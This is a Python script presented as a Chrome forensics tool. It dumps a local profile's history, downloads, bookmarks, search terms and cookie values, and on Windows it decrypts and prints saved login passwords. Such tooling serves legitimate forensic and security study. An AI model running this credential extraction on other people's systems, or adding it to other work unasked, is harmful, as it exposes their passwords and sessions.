# Tested with python 3.6
# ChromeJunkie v1.0
import json
import os
import sqlite3
import sys
try:
    import bs4
    import ssl
    import urllib.request
except:
    print("/!\ bs4 is not installed!! you cannot fetch user-installed extensions!!")
try:
    import win32crypt
except:
    pass

class ChromeJunkie(object):
    def __init__(self, path):
        self.path = path

    def bookmarks(self):
        bks = "\n"

        try:
            pathHistDB = self.path + "History"
            pathBksDB = self.path + "Bookmarks"
            jsn = open(pathBksDB)
            data = json.load(jsn)
            numOfBookmards = len(data["roots"]["bookmark_bar"]["children"])
            bks += "Number Of Bookmarks: " + str(numOfBookmards) + "\n"
            for i in range(numOfBookmards):
                try:
                    bks += str(i+1) + "- URL: " + str(data["roots"]["bookmark_bar"]["children"][i]["url"]) + "\n"
                    bks += "Name: " + str(data["roots"]["bookmark_bar"]["children"][i]["name"]) + "\n"
                    date = str(data["roots"]["bookmark_bar"]["children"][i]["date_added"])
                    con = sqlite3.connect(pathHistDB)
                    query = "SELECT datetime((" + date + "/1000000)-11644473600,'unixepoch', 'localtime')"
                    cur = con.cursor()
                    res = cur.execute(query)
                    for r in res:
                        bks += "Date: " + str(r[0]) + "\n\n"
                except:
                    continue
        except IOError:
            print("/!\ Bookmarks DB missing!! (maybe the user never bookmarked any URL)")
            sys.exit(0)
        except:
            pass

        return bks


    def downloads(self):
        dls = "\n"
        count = 1

        try:
            pathHistDB = self.path + "History"
            con = sqlite3.connect(pathHistDB)
            cur =  con.cursor()
            query = "SELECT tab_url, current_path, received_bytes, total_bytes, \
            datetime((start_time/1000000)-11644473600, 'unixepoch', 'localtime'), \
            datetime((end_time/1000000)-11644473600, 'unixepoch', 'localtime') FROM downloads"
            res = cur.execute(query)
            dls += "Downloads: \n"
            for r in res:
                try:
                    dls += str(count) + "- URL: " + str(r[0]) + "\n"
                    dls += "Path: " + str(r[1]) + "\n"
                    dls += "Received bytes: {0} Bytes, {1:0.2f} KB, {2:0.3f} MB, {3:0.6f} GB.".format(float(r[2]), float(r[2]/1024), float(r[2]/1048576), float(r[2]/1073741824)) + "\n"
                    dls += "Total bytes: {0} Bytes, {1:0.2f} KB, {2:0.3f} MB, {3:0.6f} GB.".format(float(r[3]), float(r[3]/1024), float(r[3]/1048576), float(r[3]/1073741824)) + "\n"
                    dls += "Start time: " + str(r[4]) + "\n"
                    dls += "End time: " + str(r[5]) + "\n\n"
                    count+=1
                except:
                    continue
        except:
            print("/!\ Something went wrong, make sure that Chrome is not running!!")
            sys.exit(0)

        return dls


    def history(self):
        his = "\n"
        count = 0

        try:
            pathHistDB = self.path + "History"
            con = sqlite3.connect(pathHistDB)
            cur = con.cursor()
            query = "SELECT urls.url, urls.visit_count, datetime((urls.last_visit_time/1000000)-11644473600,'unixepoch', 'localtime') \
            FROM urls, visits WHERE urls.id = visits.url"
            res = cur.execute(query)
            his += "History: \n"
            for r in res:
                try:
                    count += 1
                    his += str(count) + "- URL: " + str((r[0].encode("utf-8")).decode("ascii")) + "\n"
                    his += "Number of visits: " + str(r[1]) + "\n"
                    his += "Last visited at: " + str(r[2]) + "\n\n"
                except:
                    continue
        except:
            print("/!\ Something went wrong, make sure that Chrome is not running!!")
            sys.exit(0)

        return his


    def cookies(self):
        cks = "\n"
        count = 1

        try:
            pathCkDB = self.path + "Cookies"
            con = sqlite3.connect(pathCkDB)
            cur = con.cursor()
            query = "SELECT host_key, name, path, secure, httponly, datetime((creation_utc/1000000)-11644473600,'unixepoch', 'localtime'), \
            datetime((expires_utc/1000000)-11644473600,'unixepoch','localtime'), datetime((last_access_utc/1000000)-11644473600,'unixepoch','localtime'), value, encrypted_value from cookies;"
            res = cur.execute(query)
            cks += "Cookies: \n"
            for r in res:
                cks += str(count) + "- Host: " + str(r[0]) + "\n"
                cks += "Name: " + str(r[1]) + "\n"
                cks += "Path: " + str(r[2]) + "\n"
                if r[3] == 1:
                    cks += "Secure flag: Yes\n"
                else:
                    cks += "Secure flag: No\n"
                if r[4] == 1:
                    cks += "HttpOnly flag: Yes\n"
                else:
                    cks += "HttpOnly flag: No\n"
                cks += "Created on: " + str(r[5]) + "\n"
                cks += "Expires on: " + str(r[6]) + "\n"
                cks += "Last accessed on: " + str(r[7]) + "\n"
                if len(str(r[8])) == 0:
                    cks += "The value cookie is encrypted\n\n"
                else:
                    cks += "Value: " + str(r[8]) + "\n\n"
                count += 1
        except:
            print("/!\ Something went wrong, make sure that Chrome is not running!!")
        if  len(cks) == 11:
            cks += "No cookies found, maybe the user disabled or cleared them!!"
            return cks

        return cks


    def searchedKeywords(self):
        sks = "\n"
        count = 1

        try:
            pathHistDB = self.path + "History"
            con = sqlite3.connect(pathHistDB)
            cur = con.cursor()
            query = "SELECT term FROM keyword_search_terms"
            res = cur.execute(query)
            sks += "keywords typed in the URL bar of the start page: \n"
            for r in res:
                try:
                    sks += str(count) + "- " + str((r[0].encode("utf-8")).decode("ascii")) + "\n"
                    count += 1
                except:
                    continue
            sks += "\n"
        except:
            print("/!\ Something went wrong, make sure that Chrome is not running!!")
            sys.exit(0)

        return sks


    def extensions(self):
        if "bs4" not in sys.modules:
            print("Install bs4 first!!")
            sys.exit(0)
        exts = ""
        defExts = "\n"
        userExts = "\n"
        defCount = 1
        userCount = 1
        x = 0
        pathToExts = self.path + "Extensions"
        defaultExtensions = {"aapocclcgogkmnckokdopfmhonfmgoek":"Slides", "aohghmighlieiainnegkcijnfilokake":"Docs", "apdfllckaahabafndbhieahigkjlhalf":"Google Drive",
        "blpcfgokakmgnkcojhhkbfbldkacnbeo":"Youtube", "felcaaldnbdncclmgdcncolpebgiejap":"Sheets", "ghbmnnjooekpmoecnnnilnnbdlolhkhi":"Google Docs Offline",
        "nmmhkkegccagdldgiimedpiccmgmieda":"Chrome Web Store Payments", "pjkljhegncpnkpknbcohdijeoejaedia":"Gmail", "pkedcjkdefgpdelpbcmbmeomcjbeemfm":"Chrome Media Router"}
        print("[!]Fetching extensions requires Internet connection to fetch user-installed extensions...")

        extIDs = os.listdir(pathToExts)
        exts += "Found extensions: \n"
        for i in extIDs:
            if i[0] != "." and len(i) == 32:
                if i in defaultExtensions.keys():
                    defExts += str(defCount) + "- " + str(defaultExtensions.get(i)) + "\n"
                    defCount += 1
                else:
                    if x == 0:
                        print("[~]Fetching user-installed extensions online, this might take a few seconds depending on the number of installed extensions...")
                        x += 1
                    context = ssl._create_unverified_context()
                    try:
                        w = urllib.request.urlopen("https://chrome.google.com/webstore/detail/" + i, context=context)
                        soup = bs4.BeautifulSoup(w, "html.parser")
                        userExts += str(userCount) + "- " + str("".join(soup.find_all("h1")[0].get_text()) + "\n")
                        userCount += 1
                    except:
                        pass
        exts = "\nDefault extensions: " + defExts + "\nUser-installed extensions: " + userExts

        return exts


    def loginData(self):
        data = "\n"
        pathToLgDtDB = self.path + "Login Data"
        count = 1

        try:
            con = sqlite3.connect(pathToLgDtDB)
            cur = con.cursor()
            query = "SELECT username_value, password_value, origin_url FROM logins"
            cur.execute(query)
            res = cur.fetchall()
            if sys.platform == "win32":
                if "win32crypt" not in sys.modules:
                    print("/!\ Install pywin32 first!!")
                    sys.exit(0)
                for r in res:
                    pwd = win32crypt.CryptUnprotectData(r[1], None, None, None, 0)[1]
                    data += str(count) + "- URL: " + str(r[2]) + "\n"
                    data += "Username: " + str(r[0]) + "\n"
                    data += "Password: " + pwd.decode("utf-8") + "\n\n"
                    count += 1
                return data
            else:
                print("/!\ This OS is not supported!!")
                sys.exit(0)
        except:
            print("/!\ Something went wrong, make sure that Chrome is not running!!")
            sys.exit(0)


def saveToFile(result):

    file = open("Report.txt", "w", encoding = "utf-8")
    file.write(result)
    file.close()
    print("[!]Results saved to Report.txt")



def output(result):
    try:
        inp = input("Do you want to save the results to a file?? [y/n]: ")
        if inp == "n":
            print(result)
        elif inp == "y":
            saveToFile(result)
        else:
            print("/!\ Invalid Input!!")
    except KeyboardInterrupt:
        print("\n/!\ Exiting!!\n")
    except Exception as e:
        print(e)


def asciiBanner():
    b = """
 _______ _     _  ______  _____  _______ _______
 |       |_____| |_____/ |     | |  |  | |______
 |_____  |     | |    \_ |_____| |  |  | |______

 _____ _     _ __   _ _     _ _____ _______
   |   |     | | \  | |____/    |   |______
 __|   |_____| |  \_| |    \_ __|__ |______

    """
    print(b)
    print("[#]ChromeJunkie is a cross-platform forensic framework for Google Chrome")
    print("[#]https://github.com/MalwareJunkie\n")


def main():

    path = ""
    asciiBanner()

    # OS
    if sys.platform == "win32":
        path = os.getenv("localappdata") + "\\Google\\Chrome\\User Data\\Default\\"
        if os.path.exists(path) == False:
            print("/!\ Chrome is not installed!!")
            sys.exit(0)
    elif sys.platform == "darwin":
        path = os.getenv("HOME") + "/Library/Application Support/Google/Chrome/Default/"
        if os.path.exists(path) == False:
            print("/!\ Chrome is not installed!!")
    elif sys.platform == "linux":
        path = os.getenv("HOME") + "/.config/google-chrome/Default/"
        if os.path.exists(path) == False:
            print("/!\ Chrome is not installed!!")

    # Input
    while 1:
        try:
            inp = int(input("0: Bookmarks \n1: Downloads \n2: History \n3: Cookies \n4: Searched Keywords \n5: Extensions \n6: Login Data \nEnter a number: "))
        except ValueError:
            print("/!\ Invalid Input!!")
            continue
        except KeyboardInterrupt:
            print("\n/!\ Exiting\n")
            sys.exit(0)

        if inp == 0:
            bks = ChromeJunkie(path).bookmarks()
            output(bks)
            break
            # Bookmarks
        elif inp == 1:
            dls = ChromeJunkie(path).downloads()
            output(dls)
            break
            # Downloads
        elif inp == 2:
            his = ChromeJunkie(path).history()
            output(his)
            break
            # History
        elif inp == 3:
            cks = ChromeJunkie(path).cookies()
            output(cks)
            break
            # Cookies
        elif inp == 4:
            sks = ChromeJunkie(path).searchedKeywords()
            output(sks)
            break
            # Searched Keywords
        elif inp == 5:
            exts = ChromeJunkie(path).extensions()
            output(exts)
            break
            # Exit
        elif inp == 6:
            data = ChromeJunkie(path).loginData()
            output(data)
            break
        else:
            print("/!\ Invalid Input!!")


if __name__ == "__main__":
    main()
